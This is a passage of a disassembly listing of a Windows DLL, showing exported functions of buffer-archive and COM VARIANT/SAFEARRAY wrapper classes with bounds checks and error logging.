Ordinal1430	endp

; Exported entry 1424.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1424
Ordinal1424	proc near		; CODE XREF: Ordinal1347+11p
					; sub_6AF50E77+3p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF60B4C
		call	Ordinal1427
		mov	ecx, esi
		pop	esi
		jmp	Ordinal891
Ordinal1424	endp

; Exported entry 1429.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1429
Ordinal1429	proc near		; CODE XREF: Ordinal1348+2Ep
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1427
		push	offset aKernel32_dll_0 ; "KERNEL32.DLL"
		mov	ecx, esi
		call	Ordinal1425
		pop	esi
		retn
Ordinal1429	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF50E77(void *, char)
sub_6AF50E77	proc near		; DATA XREF: .rdata:off_6AF60B4Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1424
		test	[esp+4+arg_0], 1
		jz	short loc_6AF50E8D
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF50E8D:				; CODE XREF: sub_6AF50E77+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF50E77	endp

; Exported entry 1431.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1431
Ordinal1431	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	edi
		push	[esp+8+arg_0]
		mov	esi, ecx
		call	Ordinal311
		lea	edi, [esi+18h]
		mov	ecx, edi
		call	Ordinal1496
		and	dword ptr [esi+38h], 0
		mov	dword ptr [edi], offset	off_6AF60B60
		pop	edi
		mov	dword ptr [esi], offset	off_6AF60B50
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1431	endp

; Exported entry 1432.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1432
Ordinal1432	proc near		; CODE XREF: sub_6AF51073+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+18h]
		mov	dword ptr [esi], offset	off_6AF60B50
		mov	dword ptr [ecx], offset	off_6AF60B60
		call	Ordinal1499
		mov	ecx, esi
		pop	esi
		jmp	Ordinal312
Ordinal1432	endp

; Exported entry 1433.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1433
Ordinal1433	proc near		; DATA XREF: .rdata:off_6AF66098o
		and	dword ptr [ecx+38h], 0
		xor	eax, eax
		inc	eax
		retn
Ordinal1433	endp

; Exported entry 1434.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1434
Ordinal1434	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+18h]
		call	Ordinal1518
		mov	[esi+38h], eax
		xor	eax, eax
		inc	eax
		pop	esi
		retn
Ordinal1434	endp

; Exported entry 885.
; Exported entry 1435.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1435
Ordinal1435	proc near		; CODE XREF: Ordinal291+58p
					; Ordinal292+5Cp
					; DATA XREF: ...
		jmp	Ordinal364	; ccL30_885
Ordinal1435	endp

; Exported entry 798.
; Exported entry 1436.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal798
Ordinal798	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal317	; ccL30_798
Ordinal798	endp

; Exported entry 799.
; Exported entry 1437.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal799
Ordinal799	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal318	; ccL30_799
Ordinal799	endp

; Exported entry 808.
; Exported entry 1446.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal808
Ordinal808	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal327	; ccL30_808
Ordinal808	endp

; Exported entry 812.
; Exported entry 1450.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1450
Ordinal1450	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal331	; ccL30_812
Ordinal1450	endp

; Exported entry 813.
; Exported entry 1451.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1451
Ordinal1451	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal332	; ccL30_813
Ordinal1451	endp

; Exported entry 814.
; Exported entry 1452.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1452
Ordinal1452	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal333	; ccL30_814
Ordinal1452	endp

; Exported entry 815.
; Exported entry 1453.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal815
Ordinal815	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal334	; ccL30_815
Ordinal815	endp

; Exported entry 818.
; Exported entry 1456.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1456
Ordinal1456	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal337	; ccL30_818
Ordinal1456	endp

; Exported entry 819.
; Exported entry 1457.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal819
Ordinal819	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal338	; ccL30_819
Ordinal819	endp

; Exported entry 820.
; Exported entry 1458.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1458
Ordinal1458	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal339	; ccL30_820
Ordinal1458	endp

; Exported entry 823.
; Exported entry 1461.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal823
Ordinal823	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal342	; ccL30_823
Ordinal823	endp

; Exported entry 1463.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1463(void *Dst, size_t Size)
		public Ordinal1463
Ordinal1463	proc near		; DATA XREF: .rdata:6AF60B54o
					; .rdata:off_6AF66098o

Dst		= dword	ptr  4
Size		= dword	ptr  8

		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+18h]
		mov	ecx, edi
		call	Ordinal1518
		sub	eax, [esi+38h]
		mov	ebx, [esp+0Ch+Size]
		cmp	eax, ebx
		jnb	short loc_6AF50F60
		push	offset aCvariantarchiv ; "CVariantArchive::ReadEx() : CVariantBuf"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF50F85
; ---------------------------------------------------------------------------

loc_6AF50F60:				; CODE XREF: Ordinal1463+18j
		mov	ecx, edi
		call	Ordinal1519
		add	eax, [esi+38h]
		push	ebx		; Size
		push	eax		; Src
		push	[esp+14h+Dst]	; Dst
		call	memcpy
		add	[esi+38h], ebx
		add	esp, 0Ch
		mov	ecx, edi
		call	Ordinal1520
		xor	eax, eax
		inc	eax

loc_6AF50F85:				; CODE XREF: Ordinal1463+27j
		pop	edi
		pop	esi
		pop	ebx
		retn	8
Ordinal1463	endp

; Exported entry 1465.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1465
Ordinal1465	proc near		; DATA XREF: .rdata:6AF60B5Co
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+18h]
		call	Ordinal1518
		mov	edx, [esp+4+arg_4]
		xor	ecx, ecx
		cmp	edx, ecx
		mov	ecx, [esp+4+arg_0]
		jb	short loc_6AF50FB9
		ja	short loc_6AF50FAA
		cmp	ecx, eax
		jb	short loc_6AF50FB9

loc_6AF50FAA:				; CODE XREF: Ordinal1465+19j
		push	offset aCvariantarch_0 ; "CVariantArchive::SetPosEx() :	uPos >=	C"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF50FBF
; ---------------------------------------------------------------------------

loc_6AF50FB9:				; CODE XREF: Ordinal1465+17j
					; Ordinal1465+1Dj
		xor	eax, eax
		mov	[esi+38h], ecx
		inc	eax

loc_6AF50FBF:				; CODE XREF: Ordinal1465+2Cj
		pop	esi
		retn	8
Ordinal1465	endp

; Exported entry 1466.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1466(ULONG cElements)
		public Ordinal1466
Ordinal1466	proc near		; CODE XREF: Ordinal1464+3Fp
					; DATA XREF: .rdata:off_6AF66098o

var_20		= byte ptr -20h
cElements	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		push	esi
		lea	esi, [ecx+18h]
		push	edi
		mov	ecx, esi
		call	Ordinal1518
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF50FEA
		push	offset aCvariantarch_1 ; "CVariantArchive::ReSize() : dwCurrentSi"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF51065
; ---------------------------------------------------------------------------

loc_6AF50FEA:				; CODE XREF: Ordinal1466+16j
		cmp	edi, [ebp+cElements]
		jnz	short loc_6AF50FFF
		push	offset aCvariantarch_2 ; "CVariantArchive::ReAlloc() : dwCurrentS"...
		call	sub_6AF3101A
		xor	eax, eax
		pop	ecx
		inc	eax
		jmp	short loc_6AF51065
; ---------------------------------------------------------------------------

loc_6AF50FFF:				; CODE XREF: Ordinal1466+2Aj
		lea	ecx, [ebp+var_20]
		call	Ordinal1496
		push	[ebp+cElements]	; cElements
		lea	ecx, [ebp+var_20]
		call	Ordinal1504
		test	eax, eax
		jnz	short loc_6AF51025
		push	offset aCvariantarch_3 ; "CVariantArchive::ReAlloc() : nCurrentSi"...
		call	sub_6AF3101A
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF5105B
; ---------------------------------------------------------------------------

loc_6AF51025:				; CODE XREF: Ordinal1466+51j
		push	edi		; Size
		mov	ecx, esi
		call	Ordinal1519
		push	eax		; Src
		lea	ecx, [ebp+var_20]
		call	Ordinal1519
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch
		lea	ecx, [ebp+var_20]
		call	Ordinal1520
		mov	ecx, esi
		call	Ordinal1520
		lea	eax, [ebp+var_20]
		push	eax
		mov	ecx, esi
		call	Ordinal1508
		mov	esi, eax

loc_6AF5105B:				; CODE XREF: Ordinal1466+60j
		lea	ecx, [ebp+var_20]
		call	Ordinal1499
		mov	eax, esi

loc_6AF51065:				; CODE XREF: Ordinal1466+25j
					; Ordinal1466+3Aj
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal1466	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5106B	proc near		; DATA XREF: .rdata:off_6AF60B60o
		sub	ecx, 18h
		jmp	$+5
sub_6AF5106B	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF51073(void *, char)
sub_6AF51073	proc near		; DATA XREF: .rdata:off_6AF60B50o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1432
		test	[esp+4+arg_0], 1
		jz	short loc_6AF51089
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF51089:				; CODE XREF: sub_6AF51073+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF51073	endp

; Exported entry 1464.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1464(void *Src, size_t cElements)
		public Ordinal1464
Ordinal1464	proc near		; DATA XREF: .rdata:6AF60B58o
					; .rdata:off_6AF66098o

Src		= dword	ptr  4
cElements	= dword	ptr  8

		push	ebx
		push	esi
		mov	esi, ecx
		lea	ebx, [esi+18h]
		push	edi
		mov	ecx, ebx
		call	Ordinal1517
		test	eax, eax
		mov	edi, [esp+0Ch+cElements]
		jnz	short loc_6AF510B9
		push	edi		; cElements
		mov	ecx, ebx
		call	Ordinal1504
		test	eax, eax
		jnz	short loc_6AF510B9
		push	offset aCvariantarch_4 ; "CVariantArchive::WriteEx() : Create(dwS"...
		jmp	short loc_6AF510DC
; ---------------------------------------------------------------------------

loc_6AF510B9:				; CODE XREF: Ordinal1464+15j
					; Ordinal1464+21j
		mov	ecx, ebx
		call	Ordinal1518
		mov	ecx, eax
		sub	ecx, [esi+38h]
		cmp	ecx, edi
		jnb	short loc_6AF510E6
		add	eax, edi
		push	eax		; cElements
		mov	ecx, esi
		call	Ordinal1466
		test	eax, eax
		jnz	short loc_6AF510E6
		push	offset aCvariantarch_5 ; "CVariantArchive::WriteEx() : ReSize()	="...

loc_6AF510DC:				; CODE XREF: Ordinal1464+28j
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF5110B
; ---------------------------------------------------------------------------

loc_6AF510E6:				; CODE XREF: Ordinal1464+38j
					; Ordinal1464+46j
		mov	ecx, ebx
		call	Ordinal1519
		add	eax, [esi+38h]
		push	edi		; Size
		push	[esp+10h+Src]	; Src
		push	eax		; Dst
		call	memcpy
		add	[esi+38h], edi
		add	esp, 0Ch
		mov	ecx, ebx
		call	Ordinal1520
		xor	eax, eax
		inc	eax

loc_6AF5110B:				; CODE XREF: Ordinal1464+55j
		pop	edi
		pop	esi
		pop	ebx
		retn	8
Ordinal1464	endp

; Exported entry 1467.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1467
Ordinal1467	proc near		; CODE XREF: Ordinal375+Dp
					; Ordinal371+5Dp ...
		push	esi
		mov	esi, ecx
		lea	eax, [esi+8]
		push	eax		; pvarg
		mov	dword ptr [esi], offset	off_6AF60D00
		mov	[esi+18h], eax
		call	ds:VariantInit
		mov	eax, esi
		pop	esi
		retn
Ordinal1467	endp

; Exported entry 1474.
; Exported entry 1503.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1474
Ordinal1474	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0] ; ccL30_1474
		push	esi
		mov	esi, [ecx+18h]
		push	edi
		mov	edi, eax
		movsd
		movsd
		movsd
		movsd
		pop	edi
		pop	esi
		retn	4
Ordinal1474	endp

; Exported entry 1490.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1490
Ordinal1490	proc near		; CODE XREF: Ordinal1491+18p
					; Ordinal1492+19p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		jmp	short loc_6AF5114F
; ---------------------------------------------------------------------------

loc_6AF51145:				; CODE XREF: Ordinal1490+12j
		cmp	word ptr [eax],	400Ch
		jnz	short locret_6AF51160
		mov	eax, [eax+8]

loc_6AF5114F:				; CODE XREF: Ordinal1490+4j
		test	eax, eax
		jnz	short loc_6AF51145
		push	offset aCvariantarrayG ; "CVariantArray::GetVariant() :	pVariant "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

locret_6AF51160:			; CODE XREF: Ordinal1490+Bj
		retn
Ordinal1490	endp

; Exported entry 1491.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1491
Ordinal1491	proc near		; CODE XREF: Ordinal1492+2Ep
					; Ordinal1494+3p ...

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jnz	short loc_6AF51175
		push	offset aCvariantarra_0 ; "CVariantArray::GetSafeArray()	: pVarian"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF51187
; ---------------------------------------------------------------------------

loc_6AF51175:				; CODE XREF: Ordinal1491+5j
		push	[esp+arg_0]
		call	Ordinal1490
		pop	ecx
		mov	cx, [eax]
		test	ch, 20h
		jnz	short loc_6AF5118A

loc_6AF51187:				; CODE XREF: Ordinal1491+12j
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF5118A:				; CODE XREF: Ordinal1491+24j
		test	ch, 40h
		mov	eax, [eax+8]
		jz	short locret_6AF51194
		mov	eax, [eax]

locret_6AF51194:			; CODE XREF: Ordinal1491+2Fj
		retn
Ordinal1491	endp

; Exported entry 1492.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1492
Ordinal1492	proc near		; CODE XREF: Ordinal1493+Dp
					; Ordinal1478+Dp ...

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jnz	short loc_6AF511AA
		push	offset aCvariantarrayI ; "CVariantArray::IsVariantArray() : pVari"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF511A7:				; CODE XREF: Ordinal1492+21j
					; Ordinal1492+2Bj ...
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF511AA:				; CODE XREF: Ordinal1492+5j
		push	[esp+arg_0]
		call	Ordinal1490
		test	eax, eax
		pop	ecx
		jz	short loc_6AF511A7
		mov	cl, [eax]
		and	cl, 0Ch
		cmp	cl, 0Ch
		jnz	short loc_6AF511A7
		push	eax
		call	Ordinal1491
		test	eax, eax
		pop	ecx
		jz	short loc_6AF511A7
		cmp	word ptr [eax],	1
		jnz	short loc_6AF511A7
		cmp	dword ptr [eax+14h], 0
		jnz	short loc_6AF511A7
		xor	eax, eax
		inc	eax
		retn
Ordinal1492	endp

; Exported entry 1493.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1493
Ordinal1493	proc near		; CODE XREF: Ordinal371+72p
					; Ordinal374+2Ep ...
		mov	eax, [ecx+18h]
		cmp	word ptr [eax],	0
		jnz	short loc_6AF511E9
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF511E9:				; CODE XREF: Ordinal1493+7j
		push	eax
		call	Ordinal1492
		pop	ecx
		retn
Ordinal1493	endp

; Exported entry 1494.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1494
Ordinal1494	proc near		; CODE XREF: Ordinal371+8Ap
					; Ordinal374+3Ep ...
		push	dword ptr [ecx+18h]
		call	Ordinal1491
		test	eax, eax
		pop	ecx
		jnz	short loc_6AF5120C
		push	offset aCvariantarra_1 ; "CVariantArray::GetSize() : pSa == NULL\n"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF5120C:				; CODE XREF: Ordinal1494+Bj
		mov	eax, [eax+10h]
		retn
Ordinal1494	endp

; Exported entry 1495.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1495
Ordinal1495	proc near		; CODE XREF: Ordinal1486+2Dp
					; DATA XREF: .rdata:off_6AF66098o

psaboundNew	= SAFEARRAYBOUND ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal1493
		test	eax, eax
		jz	short loc_6AF5126C
		mov	edi, [ebp+arg_0]
		test	edi, edi
		jl	short loc_6AF5126C
		push	dword ptr [esi+18h]
		call	Ordinal1491
		pop	ecx
		mov	ecx, [eax+10h]
		mov	[ebp+psaboundNew.cElements], ecx
		mov	eax, [eax+14h]
		mov	[ebp+psaboundNew.lLbound], eax
		lea	eax, [ebp+psaboundNew]
		push	eax		; psaboundNew
		push	dword ptr [esi+18h]
		mov	[ebp+psaboundNew.cElements], edi
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayRedim
		test	eax, eax
		jge	short loc_6AF51267
		push	eax		; Args
		push	offset aCvariantarrayS ; "CVariantArray::SetSize() : SafeArrayRed"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF51276
; ---------------------------------------------------------------------------

loc_6AF51267:				; CODE XREF: Ordinal1495+47j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF51279
; ---------------------------------------------------------------------------

loc_6AF5126C:				; CODE XREF: Ordinal1495+10j
					; Ordinal1495+17j
		push	offset aCvariantarra_2 ; "CVariantArray::SetSize() : IsArray() =="...
		call	sub_6AF3102E

loc_6AF51276:				; CODE XREF: Ordinal1495+55j
		pop	ecx
		xor	eax, eax

loc_6AF51279:				; CODE XREF: Ordinal1495+5Aj
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal1495	endp

; Exported entry 1476.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1476
Ordinal1476	proc near		; CODE XREF: Ordinal1478+19p
					; Ordinal1480+1Ap ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+18h]
		cmp	word ptr [eax],	0
		jz	short loc_6AF512A5
		push	edi
		push	eax
		call	Ordinal1491
		mov	edi, eax
		test	edi, edi
		pop	ecx
		jz	short loc_6AF512A4

loc_6AF51299:				; CODE XREF: Ordinal1476+23j
		push	edi		; psa
		call	ds:SafeArrayUnlock
		test	eax, eax
		jge	short loc_6AF51299

loc_6AF512A4:				; CODE XREF: Ordinal1476+18j
		pop	edi

loc_6AF512A5:				; CODE XREF: Ordinal1476+Aj
		push	dword ptr [esi+18h] ; pvarg
		call	ds:VariantClear
		pop	esi
		retn
Ordinal1476	endp

; Exported entry 1478.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1478(VARIANTARG *pvargSrc)
		public Ordinal1478
Ordinal1478	proc near		; CODE XREF: Ordinal1469+1Cp
					; Ordinal1472+Dp ...

pvargSrc	= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+pvargSrc]
		test	edi, edi
		mov	esi, ecx
		jz	short loc_6AF512EF
		push	edi
		call	Ordinal1492
		test	eax, eax
		pop	ecx
		jz	short loc_6AF512EF
		mov	ecx, esi
		call	Ordinal1476
		push	edi		; pvargSrc
		push	dword ptr [esi+18h] ; pvarDest
		call	ds:VariantCopyInd
		test	eax, eax
		jge	short loc_6AF512EA
		push	eax		; Args
		push	offset aCvariantarrayC ; "CVariantArray::Copy()	: VariantCopyInd("...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF512F9
; ---------------------------------------------------------------------------

loc_6AF512EA:				; CODE XREF: Ordinal1478+2Aj
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF512FC
; ---------------------------------------------------------------------------

loc_6AF512EF:				; CODE XREF: Ordinal1478+Aj
					; Ordinal1478+15j
		push	offset aCvariantarra_3 ; "CVariantArray::Copy()	: pVariant == NUL"...
		call	sub_6AF3102E

loc_6AF512F9:				; CODE XREF: Ordinal1478+38j
		pop	ecx
		xor	eax, eax

loc_6AF512FC:				; CODE XREF: Ordinal1478+3Dj
		pop	edi
		pop	esi
		retn	4
Ordinal1478	endp

; Exported entry 1480.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1480(VARIANTARG *pvarg)
		public Ordinal1480
Ordinal1480	proc near		; CODE XREF: Ordinal1479+7p
					; DATA XREF: .rdata:off_6AF66098o

pvarg		= dword	ptr  4

		push	ebx
		mov	ebx, [esp+4+pvarg]
		test	ebx, ebx
		push	edi
		mov	edi, ecx
		jz	short loc_6AF51336
		push	ebx
		call	Ordinal1492
		test	eax, eax
		pop	ecx
		jz	short loc_6AF51336
		push	esi
		mov	ecx, edi
		call	Ordinal1476
		mov	edi, [edi+18h]
		mov	esi, ebx
		movsd
		movsd
		movsd
		push	ebx		; pvarg
		movsd
		call	ds:VariantInit
		xor	eax, eax
		inc	eax
		pop	esi
		jmp	short loc_6AF51343
; ---------------------------------------------------------------------------

loc_6AF51336:				; CODE XREF: Ordinal1480+Aj
					; Ordinal1480+15j
		push	offset aCvariantarrayA ; "CVariantArray::Attach() : pVariant ==	N"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF51343:				; CODE XREF: Ordinal1480+33j
		pop	edi
		pop	ebx
		retn	4
Ordinal1480	endp

; Exported entry 1481.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1481(VARIANTARG *pvarg)
		public Ordinal1481
Ordinal1481	proc near		; CODE XREF: Ordinal375+BEp
					; DATA XREF: .rdata:off_6AF66098o

pvarg		= dword	ptr  4

		push	ebx
		push	edi
		mov	edi, [esp+8+pvarg]
		test	edi, edi
		mov	ebx, ecx
		jnz	short loc_6AF51363
		push	offset aCvariantarrayD ; "CVariantArray::Detach() : pVariant ==	N"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF51386
; ---------------------------------------------------------------------------

loc_6AF51363:				; CODE XREF: Ordinal1481+Aj
		push	esi
		push	edi		; pvarg
		call	ds:VariantClear
		mov	esi, [ebx+18h]
		movsd
		movsd
		movsd
		movsd
		push	dword ptr [ebx+18h] ; pvarg
		call	ds:VariantInit
		mov	ecx, ebx
		call	Ordinal1476
		xor	eax, eax
		inc	eax
		pop	esi

loc_6AF51386:				; CODE XREF: Ordinal1481+19j
		pop	edi
		pop	ebx
		retn	4
Ordinal1481	endp

; Exported entry 1482.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1482
Ordinal1482	proc near		; CODE XREF: Ordinal371+66p
					; Ordinal374+1Ep
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		test	edi, edi
		mov	esi, ecx
		jnz	short loc_6AF513A6
		push	offset aCvariantarrayR ; "CVariantArray::Reference() : pVariant	="...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF513B3
; ---------------------------------------------------------------------------

loc_6AF513A6:				; CODE XREF: Ordinal1482+Aj
		mov	ecx, esi
		call	Ordinal1476
		xor	eax, eax
		mov	[esi+18h], edi
		inc	eax

loc_6AF513B3:				; CODE XREF: Ordinal1482+19j
		pop	edi
		pop	esi
		retn	4
Ordinal1482	endp

; Exported entry 1485.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1485(LONG rgIndices, VARIANTARG *pv)
		public Ordinal1485
Ordinal1485	proc near		; DATA XREF: .rdata:off_6AF66098o

rgIndices	= dword	ptr  8
pv		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		cmp	[ebp+pv], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF51416
		call	Ordinal1493
		test	eax, eax
		jz	short loc_6AF51416
		cmp	[ebp+rgIndices], 0
		jl	short loc_6AF51416
		mov	ecx, esi
		call	Ordinal1494
		cmp	[ebp+rgIndices], eax
		jge	short loc_6AF51416
		push	[ebp+pv]	; pvarg
		call	ds:VariantClear
		push	[ebp+pv]	; pv
		lea	eax, [ebp+rgIndices]
		push	eax		; rgIndices
		push	dword ptr [esi+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayGetElement
		test	eax, eax
		jge	short loc_6AF51411
		push	eax		; Args
		push	offset aCvariantarra_4 ; "CVariantArray::GetAt() : SafeArrayGetEl"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF51420
; ---------------------------------------------------------------------------

loc_6AF51411:				; CODE XREF: Ordinal1485+49j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF51423
; ---------------------------------------------------------------------------

loc_6AF51416:				; CODE XREF: Ordinal1485+Aj
					; Ordinal1485+13j ...
		push	offset aCvariantarra_5 ; "CVariantArray::GetAt() : pValue == NULL"...
		call	sub_6AF3102E

loc_6AF51420:				; CODE XREF: Ordinal1485+57j
		pop	ecx
		xor	eax, eax

loc_6AF51423:				; CODE XREF: Ordinal1485+5Cj
		pop	esi
		pop	ebp
		retn	8
Ordinal1485	endp

; Exported entry 1486.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1486(LONG rgIndices, void *pv)
		public Ordinal1486
Ordinal1486	proc near		; CODE XREF: Ordinal1484+Fp
					; DATA XREF: .rdata:off_6AF66098o

rgIndices	= dword	ptr  8
pv		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		cmp	[ebp+pv], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF51493
		call	Ordinal1493
		test	eax, eax
		jz	short loc_6AF51493
		cmp	[ebp+rgIndices], 0
		jl	short loc_6AF51493
		mov	ecx, esi
		call	Ordinal1494
		mov	ecx, [ebp+rgIndices]
		cmp	ecx, eax
		jl	short loc_6AF51465
		inc	ecx
		push	ecx
		mov	ecx, esi
		call	Ordinal1495
		test	eax, eax
		jnz	short loc_6AF51465
		push	offset aCvariantarra_6 ; "CVariantArray::SetAt() : SetSize() ==	F"...
		jmp	short loc_6AF51498
; ---------------------------------------------------------------------------

loc_6AF51465:				; CODE XREF: Ordinal1486+27j
					; Ordinal1486+34j
		push	[ebp+pv]	; pv
		lea	eax, [ebp+rgIndices]
		push	eax		; rgIndices
		push	dword ptr [esi+18h]
		call	Ordinal1491
		pop	ecx
		push	eax		; psa
		call	ds:SafeArrayPutElement
		test	eax, eax
		jge	short loc_6AF5148E
		push	eax		; Args
		push	offset aCvariantarra_7 ; "CVariantArray::SetAt() : SafeArrayPutEl"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF5149D
; ---------------------------------------------------------------------------

loc_6AF5148E:				; CODE XREF: Ordinal1486+56j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF514A0
; ---------------------------------------------------------------------------

loc_6AF51493:				; CODE XREF: Ordinal1486+Aj
					; Ordinal1486+13j ...
		push	offset aCvariantarra_8 ; "CVariantArray::SetAt() : pVariant == NU"...

loc_6AF51498:				; CODE XREF: Ordinal1486+3Bj
		call	sub_6AF3102E

loc_6AF5149D:				; CODE XREF: Ordinal1486+64j
		pop	ecx
		xor	eax, eax

loc_6AF514A0:				; CODE XREF: Ordinal1486+69j
		pop	esi
		pop	ebp
		retn	8
Ordinal1486	endp

; Exported entry 1487.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1487(LONG rgIndices)
		public Ordinal1487
Ordinal1487	proc near		; CODE XREF: Ordinal375+81p
					; Ordinal371+99p ...

ppvData		= dword	ptr -4
rgIndices	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		call	Ordinal1493
		test	eax, eax
		jz	short loc_6AF514FA
